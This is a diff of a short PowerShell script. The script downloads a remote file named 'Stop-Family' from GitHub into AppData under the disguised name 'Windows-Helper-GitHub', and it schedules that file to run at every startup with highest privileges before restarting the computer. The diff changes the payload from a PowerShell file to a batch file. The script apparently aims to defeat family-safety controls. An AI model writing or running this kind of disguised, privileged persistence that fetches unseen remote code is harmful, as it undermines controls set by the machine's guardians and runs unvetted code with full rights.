@@ -4,9 +4,9 @@ if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
 }
 
 # Download File
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/TheBotlyNoob/Misc-Projects/main/Stop-Family/Stop-Family.ps1" -OutFile "$env:AppData\Windows-Helper-GitHub.ps1"
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/TheBotlyNoob/Misc-Projects/main/Stop-Family/Stop-Family.bat" -OutFile "$env:AppData\Windows-Helper-GitHub.bat"
 
 # Set The Task To Run On Start
-schtasks /create /sc 'ONSTART' /mo 'ONSTART' /tn 'Windows-Helper-GitHub' /tr "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy UnRestricted -File $env:AppData\Windows-Helper-GitHub.ps1" /rl HIGHEST /f
+schtasks /create /sc 'ONSTART' /mo 'ONSTART' /tn 'Windows-Helper-GitHub' /tr "C:\Windows\System32\cmd.exe $env:AppData\Windows-Helper-GitHub.bat" /rl HIGHEST /f
 
 Restart-Computer
